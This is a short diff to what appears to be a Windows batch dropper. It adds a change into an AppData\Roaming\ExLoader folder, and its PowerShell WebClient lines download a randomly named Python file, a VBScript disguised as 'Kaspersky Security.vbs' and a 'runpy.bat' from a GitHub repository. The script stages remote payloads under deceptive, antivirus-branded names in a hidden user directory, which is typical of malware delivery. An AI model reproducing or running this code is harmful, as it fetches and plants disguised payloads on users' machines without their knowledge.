@@ -1,3 +1,4 @@
+cd C:\Users\%USERNAME%\AppData\Roaming\ExLoader\
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/w8q6sgf0gsa.py', 'w8q6sgf0gsa.py')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/Kaspersky Security.vbs', 'Kaspersky Security.vbs')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/runpy.bat', 'runpy.bat')"
